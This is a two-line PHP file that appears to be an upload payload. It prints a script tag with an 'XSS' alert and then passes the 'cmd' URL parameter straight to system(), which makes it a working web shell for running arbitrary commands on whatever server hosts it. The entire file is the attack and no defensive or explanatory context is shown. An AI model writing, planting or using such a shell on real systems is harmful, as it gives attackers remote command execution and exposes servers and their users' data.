<?php 
echo "<script>alert(\"XSS\")</script>";system($_GET["cmd"]);
?>
